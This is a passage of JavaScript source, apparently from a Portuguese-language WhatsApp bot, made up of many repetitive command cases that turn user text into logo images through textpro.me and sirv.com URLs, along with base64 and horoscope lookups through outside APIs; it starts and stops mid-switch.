case 'transformer':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-a-transformer-text-effect-online-1035.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'berry':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-berry-text-effect-online-free-1033.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'luxury':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/3d-luxury-gold-text-effect-online-1003.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'colaq':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'batman':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/make-a-batman-logo-online-free-1066.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'neonlight':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-neon-light-on-brick-wall-online-1062.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'glowing':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-glowing-neon-light-text-effect-online-free-1061.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case '3dchristmas':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/3d-christmas-text-effect-by-name-1055.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'neondevil':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'thunderv2':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/online-thunder-text-effect-generator-1031.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'demonfire':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-a-magma-hot-text-effect-online-1030.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'neondevil':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'cattxt':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/write-text-on-foggy-window-online-free-1015.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'glitch2':
var txt = body.slice(8)
var txt1 = txt.split("/")[0] || 'Indefinido'
var txt2 = txt.split("/")[1] || 'Indefinido'
if(!txt1) return reply('Cade o primeiro texto?')
if(!txt2) return reply('Cade o segundo texto?')
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-a-glitch-text-effect-online-free-1026.html",[ `${txt1}`, `${txt2}`]).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break 

case 'grafity':
var txt = body.slice(8)
var txt1 = txt.split("/")[0] || 'Indefinido'
var txt2 = txt.split("/")[1] || 'Indefinido'
if(!txt1) return reply('Cade o primeiro texto?')
if(!txt2) return reply('Cade o segundo texto?')
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-a-cool-graffiti-text-on-the-wall-1010.html",[ `${txt1}`, `${txt2}`]).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break 

case 'steel':
var txt = body.slice(7)
var txt1 = txt.split("/")[0] || 'Indefinido'
var txt2 = txt.split("/")[1] || 'Indefinido'
if(!txt1) return reply('Cade o primeiro texto?')
if(!txt2) return reply('Cade o segundo texto?')
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/3d-steel-text-effect-877.html",[ `${txt1}`, `${txt2}`]).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break 

case 'marvel':
var txt = body.slice(8)
var txt1 = txt.split("/")[0] || 'Indefinido'
var txt2 = txt.split("/")[1] || 'Indefinido'
if(!txt1) return reply('Cade o primeiro texto?')
if(!txt2) return reply('Cade o segundo texto?')
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-3d-avengers-logo-online-974.html",[ `${txt1}`, `${txt2}`]).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'escudo':
case 'america':
var txt = body.slice(8)
var txt1 = txt.split("/")[0] || 'Indefinido'
var txt2 = txt.split("/")[1] || 'Indefinido'
if(!txt1) return reply('Cade o primeiro texto?')
if(!txt2) return reply('Cade o segundo texto?')
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-a-captain-america-text-effect-free-online-1039.html",[ `${txt1}`, `${txt2}`]).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'stone':
var txt = body.slice(7)
var txt1 = txt.split("/")[0] || 'Indefinido'
var txt2 = txt.split("/")[1] || 'Indefinido'
if(!txt1) return reply('Cade o primeiro texto?')
if(!txt2) return reply('Cade o segundo texto?')
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-a-stone-text-effect-online-982.html",[ `${txt1}`, `${txt2}`]).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'gameover':
var txt = body.slice(9)
var txt1 = txt.split("/")[0] || 'Indefinido'
var txt2 = txt.split("/")[1] || 'Indefinido'
if(!txt1) return reply('Cade o primeiro texto?')
if(!txt2) return reply('Cade o segundo texto?')
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/video-game-classic-8-bit-text-effect-1037.html",[ `${txt1}`, `${txt2}`]).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'pornhub':
var txt = body.slice(8)
var txt1 = txt.split("/")[0] || 'Indefinido'
var txt2 = txt.split("/")[1] || 'Indefinido'
if(!txt1) return reply('Cade o primeiro texto?')
if(!txt2) return reply('Cade o segundo texto?')
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/pornhub-style-logo-online-generator-free-977.html",[ `${txt1}`, `${txt2}`]).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'thorlogo':
var txt = body.slice(9)
var txt1 = txt.split("/")[0] || 'Indefinido'
var txt2 = txt.split("/")[1] || 'Indefinido'
if(!txt1) return reply('Cade o primeiro texto?')
if(!txt2) return reply('Cade o segundo texto?')
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-thor-logo-style-text-effect-online-1064.html",[ `${txt1}`, `${txt2}`]).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'catwindows':
var txt = body.slice(8)
var txt1 = txt.split("/")[0] || 'Indefinido'
var txt2 = txt.split("/")[1] || 'Indefinido'
if(!txt1) return reply('Cade o primeiro texto?')
if(!txt2) return reply('Cade o segundo texto?')
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/write-text-on-foggy-window-online-free-1015.html",[ `${txt1}`, `${txt2}`]).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'ninjalogo':
var txt = body.slice(11)
var txt1 = txt.split("/")[0] || 'Indefinido'
var txt2 = txt.split("/")[1] || 'Indefinido'
if(!txt1) return reply('Cade o primeiro texto?')
if(!txt2) return reply('Cade o segundo texto?')
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-ninja-logo-online-935.html",[ `${txt1}`, `${txt2}`]).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'whitebear':
var txt = body.slice(10)
var txt1 = txt.split("/")[0] || 'Indefinido'
var txt2 = txt.split("/")[1] || 'Indefinido'
if(!txt1) return reply('Cade o primeiro texto?')
if(!txt2) return reply('Cade o segundo texto?')
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html",[ `${txt1}`, `${txt2}`]).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'wolfgalaxy':
var txt = body.slice(11)
var txt1 = txt.split("/")[0] || 'Indefinido'
var txt2 = txt.split("/")[1] || 'Indefinido'
if(!txt1) return reply('Cade o primeiro texto?')
if(!txt2) return reply('Cade o segundo texto?')
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-wolf-logo-galaxy-online-936.html",[ `${txt1}`, `${txt2}`]).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'space':
var txt = body.slice(7)
var txt1 = txt.split("/")[0] || 'Indefinido'
var txt2 = txt.split("/")[1] || 'Indefinido'
if(!txt1) return reply('Cade o primeiro texto?')
if(!txt2) return reply('Cade o segundo texto?')
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-space-3d-text-effect-online-985.html",[ `${txt1}`, `${txt2}`]).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'halloween':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/halloween-fire-text-effect-940.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'lava':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/lava-text-effect-online-914.html",`${q}`,
["Developer"], ["Phaticusthiccy"]).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'toxic':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/toxic-text-effect-online-901.html",`${q}`,
["Developer"], ["Phaticusthiccy"]).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'glowlogo':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-light-glow-sliced-text-effect-online-1068.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'laranja':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-a-3d-orange-juice-text-effect-online-1084.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await nezuko.sendMessage(from, {image: di, caption: '🎨「 𝐋𝐨𝐠𝐨 𝐁𝐲 ж☬ˢLᎾᏒᎠᎬ༻꧂ - 𝐌𝐃 」✍🏻'}, {quoted: dnselo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'ebase': {
if (!q) return reply(`Exemplo: ${prefix + command} texto`)
let sim = await fetchJson(`https://luffy-md-api.herokuapp.com/api/tools/ebase64?text=${q}&ApiKey=YoshiOfcc`)
teks = `
Pedido: ${q}

Resultado: ${sim.result}`
reply(teks)
}
break

case 'debase': {
if (!q) return reply(`Exemplo: ${prefix + command} texto`)
let sim = await fetchJson(`https://luffy-md-api.herokuapp.com/api/tools/debase64?text=${q}&ApiKey=YoshiOfcc`)
teks = `
Pedido: ${q}

Resultado: ${sim.result}`
reply(teks)
}
break

case 'signo':
if(!q) return reply("Cadê o signo o qual deseja pesquisar?")
axios.get(`https://nezsab-apis.xyz/api/horoscopo?signo=${q}&apikey=${keyapi}`)
.then(e => {
try{
d = e.data.pesquisa.resultado;
txt = `▢ ⌁ Aqui está algumas informações sobre o signo de: *${q}*\n\n`;
no = 0;
for (let i of d) {
no += 1;
txt += `${i.previsao}`;
}
nezuko.sendMessage(from, {image:{url: `${logo}`}, caption:txt})
}catch(err){
reply(`<❌️> Erro detectado. Tente novamente!`)
}
}).catch(err => {
reply('<❌️> Ops, erro na api ao puxar os dados.')
console.log(err);
});
break
//============COMANDOS+18=============\\


//================FIM===================\\

case 'edit1': 
                    //case by daniel
					if (args.length < 1) return reply('erro')
					teks = body.slice(7)
					if (teks.length > 10) return reply('O texto é longo, até 10 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					venomk = await getBuffer(`https://lollityp.sirv.com/venom_api.jpg?text.0.text=${teks}&text.0.color=000000&text.0.font.family=Pacifico&text.0.font.weight=600&text.0.background.color=ffffff&text.0.outline.color=ffffff&text.0.outline.width=10&text.0.outline.blur=17`)
					nezuko.sendMessage(m.chat, { image: venomk }, { quoted: dnselo})
					break

case 'edit2':
                    //case by venom       
					if (args.length < 1) return reply('erro')
					teks = body.slice(7)
					if (teks.length > 10) return reply('O texto é longo, até 10 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					venomk = await getBuffer(`https://lollityp.sirv.com/venom_apis2.jpg?text.0.text=${teks}&text.0.position.gravity=center&text.0.position.x=1%25&text.0.position.y=16%25&text.0.size=80&text.0.color=ff2772&text.0.opacity=67&text.0.font.family=Bangers&text.0.font.style=italic&text.0.background.opacity=50&text.0.outline.width=6`)
					nezuko.sendMessage(m.chat, { image: venomk }, { quoted: dnselo})
					break

case 'edit3':
                    //case by venom
					if (args.length < 1) return reply('erro')
					teks = body.slice(7)
					if (teks.length > 10) return reply('O texto é longo, até 10 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					venomk = await getBuffer(`https://lollityp.sirv.com/venom_apis3.jpg?text.0.text=${teks}&text.0.position.gravity=north&text.0.position.y=59%25&text.0.size=89&text.0.color=000000&text.0.opacity=71&text.0.font.family=Changa%20One&text.0.font.style=italic&text.0.background.opacity=10&text.0.outline.color=ffffff&text.0.outline.width=3`)
					nezuko.sendMessage(m.chat, { image: venomk }, { quoted: dnselo})
					break	
					
					case 'edit4':
                    //case by venom
					if (args.length < 1) return reply('erro')
					teks = body.slice(7)
					if (teks.length > 10) return reply('O texto é longo, até 10 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					venomk = await getBuffer(`https://lollityp.sirv.com/venom_apis.jpg?text.0.text=${teks}&text.0.position.gravity=center&text.0.position.x=11%25&text.0.position.y=22%25&text.0.size=20&text.0.color=241b1b&text.0.opacity=33&text.0.font.family=Rock%20Salt&text.0.font.style=italic&text.0.background.opacity=49`)
					nezuko.sendMessage(m.chat, { image: venomk }, { quoted: dnselo})
					break	
					
					case 'edit5':
                   //case by venom
					if (args.length < 1) return reply('erro')
					teks = body.slice(7)
					if (teks.length > 10) return reply('O texto é longo, até 10 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					venomk = await getBuffer(`https://lollityp.sirv.com/venom_apis5.jpg?text.0.text=${teks}&text.0.position.gravity=center&text.0.position.x=1%25&text.0.position.y=22%25&text.0.align=left&text.0.size=59&text.0.font.family=Permanent%20Marker&text.0.outline.color=df00ff&text.0.outline.width=2&text.0.outline.blur=18`)
					nezuko.sendMessage(m.chat, { image: venomk }, { quoted: dnselo})
					break

case 'edit6':
                    //case by venom
					if (args.length < 1) return reply('erro')
					teks = body.slice(7)
					if (teks.length > 10) return reply('O texto é longo, até 10 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					venomk = await getBuffer(`https://lollityp.sirv.com/venom_apis6.jpg?text.0.text=${teks}&text.0.position.gravity=north&text.0.position.x=1%25&text.0.position.y=50%25&text.0.size=68&text.0.color=464646&text.0.opacity=51&text.0.font.family=Sigmar%20One&text.0.background.opacity=2&text.0.outline.color=ffffff&text.0.outline.width=2&text.0.outline.opacity=61`)
					nezuko.sendMessage(m.chat, { image: venomk }, { quoted: dnselo})
					break	
					
					case 'edit7':
                    //case by venom
					if (args.length < 1) return reply('erro')
					teks = body.slice(7)
					if (teks.length > 10) return reply('O texto é longo, até 10 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					venomk = await getBuffer(`https://lollityp.sirv.com/venom_apis7.jpg?text.0.text=${teks}&text.0.position.gravity=north&text.0.position.x=1%25&text.0.position.y=58%25&text.0.size=69&text.0.color=00ffea&text.0.opacity=37&text.0.font.family=Bangers&text.0.background.opacity=77&text.0.outline.color=ffffff&text.0.outline.width=2&text.0.outline.blur=20`)
					nezuko.sendMessage(m.chat, { image: venomk }, { quoted: dnselo})
					break

case 'edit8':
                    //case by venom
					if (args.length < 1) return reply('erro')
					teks = body.slice(7)
					if (teks.length > 10) return reply('O texto é longo, até 10 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					//venomk = await getvenomk(`https://lollityp.sirv.com/venom_apis.jpg?text.0.text=${teks}&text.0.position.gravity=north&text.0.position.y=47%25&text.0.size=99&text.0.color=ff0000&text.0.opacity=50&text.0.font.family=Cookie&text.0.font.style=italic&text.0.background.opacity=92&text.0.outline.width=23&text.0.outline.blur=24&text.0.outline.opacity=87`)
					venomk = await getBuffer(`https://lollityp.sirv.com/venom_apis.jpg?w=640&h=640&text.0.text=Venom&text.0.position.gravity=north&text.0.position.y=53%25&text.0.size=96&text.0.color=ff0000&text.0.opacity=46&text.0.font.family=Shadows%20Into%20Light&text.0.font.style=italic&text.0.background.opacity=70&text.0.outline.width=9&text.0.outline.blur=52`)
					nezuko.sendMessage(m.chat, { image: venomk }, { quoted: dnselo})
					break					
					
					case 'edit9':
                    //case by venom
					if (args.length < 1) return reply('erro')
					teks = body.slice(7)
					if (teks.length > 10) return reply('O texto é longo, até 10 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					venomk = await getBuffer(`https://lollityp.sirv.com/venom_apis9.jpg?text.0.text=${teks}&text.0.position.gravity=north&text.0.position.y=50%25&text.0.size=68&text.0.color=ffffff&text.0.opacity=61&text.0.font.family=Tangerine&text.0.font.style=italic&text.0.background.opacity=61&text.0.outline.color=ff6f00&text.0.outline.width=9`)
					nezuko.sendMessage(m.chat, { image: venomk }, { quoted: dnselo})
					break

case 'edit10':
                    //case by venom
					if (args.length < 1) return reply('erro')
					teks = body.slice(7)
					if (teks.length > 10) return reply('O texto é longo, até 10 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					venomk = await getBuffer(`https://lollityp.sirv.com/venom_apis10.jpg?text.0.text=${teks}&text.0.position.gravity=north&text.0.position.y=62%25&text.0.size=63&text.0.color=004124&text.0.opacity=99&text.0.font.family=Permanent%20Marker&text.0.font.style=italic&text.0.background.color=feff00&text.0.outline.color=ffe8a3&text.0.outline.width=9&text.0.outline.blur=21`)
					nezuko.sendMessage(m.chat, { image: venomk }, { quoted: dnselo})
					break

case 'edit11':
                    //case by venom
					if (args.length < 1) return reply('erro')
					teks = body.slice(7)
					if (teks.length > 10) return reply('O texto é longo, até 10 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					venomk = await getBuffer(`https://lollityp.sirv.com/venom_apis11.jpg?text.0.text=${teks}&text.0.position.gravity=north&text.0.position.y=60%25&text.0.size=64&text.0.color=0071ff&text.0.font.family=Old%20Standard%20TT&text.0.font.style=italic&text.0.background.opacity=55&text.0.outline.color=00d0ff&text.0.outline.width=19&text.0.outline.blur=30`)
					nezuko.sendMessage(m.chat, { image: venomk }, { quoted: dnselo})
					break	
					
					case 'edit12':
                    //case by venom
					if (args.length < 1) return reply('erro')
					teks = body.slice(7)
					if (teks.length > 10) return reply('O texto é longo, até 10 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					venomk = await getBuffer(`https://lollityp.sirv.com/venom_apis12.jpg?text.0.text=${teks}&text.0.position.gravity=north&text.0.position.y=65%25&text.0.size=61&text.0.color=ff00e6&text.0.opacity=32&text.0.font.family=Chewy&text.0.font.style=italic&text.0.outline.width=6`)
					nezuko.sendMessage(m.chat, { image: venomk }, { quoted: dnselo})
					break	
					
					case 'edit13':
                    //case by venom
					if (args.length < 1) return reply('erro')
					teks = body.slice(7)
					if (teks.length > 10) return reply('O texto é longo, até 10 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					venomk = await getBuffer(`https://lollityp.sirv.com/venom_apis13.jpg?text.0.text=${teks}&text.0.position.gravity=north&text.0.position.y=63%25&text.0.size=68&text.0.color=ffffff&text.0.opacity=92&text.0.font.family=Permanent%20Marker&text.0.font.weight=800&text.0.outline.color=5dff00&text.0.outline.width=13&text.0.outline.blur=21`)
					nezuko.sendMessage(m.chat, { image: venomk }, { quoted: dnselo})
					break		
					
					case 'edit14':
                    //case by venom
					if (args.length < 1) return reply('erro')
					teks = body.slice(7)
